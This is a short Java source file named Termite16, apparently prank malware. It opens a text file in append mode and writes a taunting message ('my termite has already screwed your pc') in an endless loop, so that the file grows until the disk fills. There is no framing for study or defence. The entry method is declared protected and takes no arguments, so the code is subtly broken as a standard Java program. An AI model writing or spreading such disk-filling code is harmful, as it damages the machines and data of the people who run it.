import java.io.*;
public class Termite16{
    protected static void main()throws Exception{
        FileWriter file=new FileWriter("New Text Document.txt",true);
        PrintWriter pwrite=new PrintWriter(new BufferedWriter(file));
        while(true)
            pwrite.println("by the time you are seeing this, my termite has already screwed your pc");
        }}